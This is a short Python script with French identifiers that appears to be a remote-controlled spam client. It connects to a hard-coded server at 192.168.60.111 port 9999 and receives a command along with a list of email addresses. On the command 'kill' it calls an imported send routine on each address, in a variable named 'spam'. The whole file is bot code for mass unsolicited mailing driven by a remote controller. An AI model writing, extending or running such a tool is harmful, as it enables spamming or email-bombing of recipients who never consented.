import socket
import threading
import os
import smtplib
from sendmail import send
from email.message import EmailMessage


def thread_recevoir(client_socket):
    while True:

        response = str(client.recv(1024))
        response = response[2:(len(response) - 1)]

        liste_temp = (str(client.recv(1024)))
        liste_temp = liste_temp[2:(len(liste_temp) - 1)]

        liste_email = []

        index = 0
        while index != -1:
            index = liste_temp.find(' ')
            if index == -1:
                liste_email.append(liste_temp)
            else:
                liste_email.append(liste_temp[0:index])
            liste_temp = liste_temp[index + 1:len(liste_temp)]

        del liste_temp
        if response == "kill":
            for mail in liste_email:
                spam = send(mail)
                spam.send()



#main
server_ip = "192.168.60.111"
server_port = 9999
list_thread_ping = []

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.connect((server_ip,server_port))

thread_recevoir = threading.Thread(target=thread_recevoir, args={client,})
thread_recevoir.start()

while True:
    texte = input()
    client.send(str.encode(texte))
